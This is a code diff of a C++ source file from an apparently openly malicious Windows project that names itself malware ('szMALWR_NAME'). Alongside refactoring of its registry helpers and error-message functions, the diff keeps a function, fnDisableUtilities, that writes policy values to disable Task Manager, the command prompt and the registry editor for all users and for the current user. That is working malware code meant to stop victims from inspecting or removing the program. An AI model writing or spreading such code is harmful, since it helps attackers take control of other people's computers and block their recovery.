@@ -1,7 +1,7 @@
 #include "../../Header-Files/pch.h"
 #include "../../Header-Files/N0T-iLLerka.h"
 
-// TODO: needs to be modified for watchdog use
+// TODO: needs to be modified and improved for watchdog use
 BOOL fnCheckRegistryKeyW(
 	_In_ LPCWSTR lpSubKey
 ) {
@@ -12,7 +12,7 @@ BOOL fnCheckRegistryKeyW(
 		return TRUE;
 	} else {
 		SetLastError(lsRKey);
-		fnERRORHANDLERW(L"Couldn't Open Registry Key", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(),
+		fnMESSAGEHANDLERW(std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(), L"Couldn't Open Registry Key",
 			L"RegOpenKeyExW", MB_ICONWARNING);
 	}
 
@@ -23,7 +23,7 @@ BOOL fnCheckRegistryKeyW(
 		return TRUE;
 	} else {
 		SetLastError(lsRKey);
-		fnERRORHANDLERW(L"Couldn't Open Registry Key", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKCU)" }.c_str(),
+		fnMESSAGEHANDLERW(std::wstring{ szMALWR_NAME + (std::wstring)L" (HKCU)" }.c_str(), L"Couldn't Open Registry Key",
 			L"RegOpenKeyExW", MB_ICONERROR);
 	}
 
@@ -31,6 +31,7 @@ BOOL fnCheckRegistryKeyW(
 	return FALSE;
 }
 
+// TODO: modify this in order to be compatible with REG_SZ Values (needed for regestry monitoring)
 BOOL fnCreateRegistryKeyW(
 	_In_     HKEY    hKeyHK,
 	_In_     LPCWSTR lpSubKey,
@@ -53,19 +54,19 @@ BOOL fnCreateRegistryKeyW(
 				RegCloseKey(hKey);
 				return TRUE;
 			} else {
-				fnERRORHANDLERW(L"Couldn't set Registry Type/Value\nType: %d\nValue: %s 0x%X", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(),
-					L"RegSetValueExW", MB_ICONWARNING, dwType, lpValueName, dwValue);
+				fnMESSAGEHANDLERW(NULL, L"Couldn't set Registry Type/Value\nType: %d\nValue: %s 0x%X", L"RegSetValueExW",
+					MB_ICONWARNING, dwType, lpValueName, dwValue);
 			}
 		}
 	} else {
-		fnERRORHANDLERW(L"Couldn't create Registry Key\nKey: %s", NULL, L"RegCreateKeyExW", MB_ICONWARNING, lpSubKey);
+		fnMESSAGEHANDLERW(NULL, L"Couldn't create Registry Key\nKey: %s", L"RegCreateKeyExW", MB_ICONWARNING, lpSubKey);
 	}
 
 	RegCloseKey(hKey);
 	return FALSE;
 }
 
-// Placeholder
+// TODO: finish this (salvage code from the functions above)
 BOOL fnDeleteRegistryKeyW(
 	_In_     HKEY    hKeyHK,
 	_In_     LPCWSTR lpSubKey,
@@ -79,27 +80,33 @@ BOOL fnDeleteRegistryKeyW(
 	return FALSE;
 }
 
-#if DISABLE_PROTECTIONS == FALSE
+#if PROTECTIONS == TRUE
 // TODO: improve this (forloop and arrays)
 BOOL fnDisableUtilities(VOID) {
-	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableTaskMgr", REG_DWORD, 0x1)) {
+	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+		FALSE, L"DisableTaskMgr", REG_DWORD, 0x1)) {
 	}
-	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableTaskMgr", REG_DWORD, 0x1)) {
-	}
-
-	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableCMD", REG_DWORD, 0x2)) {
-	}
-	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableCMD", REG_DWORD, 0x2)) {
+	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+		FALSE, L"DisableTaskMgr", REG_DWORD, 0x1)) {
 	}
 
-	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableRegistryTools", REG_DWORD, 0x2)) {
+	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+		FALSE, L"DisableCMD", REG_DWORD, 0x2)) {
 	}
-	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", FALSE, L"DisableRegistryTools", REG_DWORD, 0x2)) {
+	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+		FALSE, L"DisableCMD", REG_DWORD, 0x2)) {
+	}
+
+	if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+		FALSE, L"DisableRegistryTools", REG_DWORD, 0x2)) {
+	}
+	if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+		FALSE, L"DisableRegistryTools", REG_DWORD, 0x2)) {
 	}
 
 	return TRUE;
 }
-#endif // !DISABLE_PROTECTIONS
+#endif // PROTECTIONS
 
 
 // Placeholder (ripped from msdn, will be modified)
